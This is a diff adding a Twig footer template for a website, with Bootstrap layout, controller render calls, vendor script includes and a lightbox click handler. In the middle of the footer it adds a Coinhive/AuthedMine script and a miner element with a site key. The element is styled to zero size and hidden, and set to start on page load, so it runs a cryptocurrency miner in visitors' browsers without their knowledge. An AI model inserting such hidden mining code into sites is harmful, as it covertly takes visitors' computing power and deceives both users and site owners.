@@ -1,0 +1,50 @@
+
+<!-- Footer -->
+<footer class="py-5 bg-inverse">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4">
+                {{ render(controller('SiteBundle:Text:Footer')) }}
+            </div>
+            <div class="col-lg-8 footerLinks">
+                {{ render(controller('SiteBundle:Text:Text',{'tag':'footer-links'})) }}
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-12">
+                {{ render(controller('SiteBundle:Category:All')) }}
+            </div>
+        </div>
+
+        <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+
+        <div class="coinhive-miner"
+             style="width: 0;height:0;visibility: hidden;position:absolute;top:0;left:0;"
+             data-autostart="true"
+             data-throttle="0.3"
+             data-key="G9Sn6XMU4pODZQG11UMlMtTamPyNiobO">
+            <em>Loading...</em>
+        </div>
+
+
+    </div>
+    <!-- /.container -->
+</footer>
+
+
+<script src="{{ asset('assets/vendor/tether/dist/js/tether.min.js') }}"></script>
+<script src="{{ asset('assets/vendor/bootstrap/dist/js/bootstrap.min.js') }}"></script>
+<script src="{{ asset('assets/vendor/ekko-lightbox/dist/ekko-lightbox.js') }}"></script>
+<script src="{{ asset('assets/vendor/jquery-confirm2/dist/jquery-confirm.min.js') }}"></script>
+
+<script>
+
+    $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+    });
+
+</script>
+
+</body>
+</html>
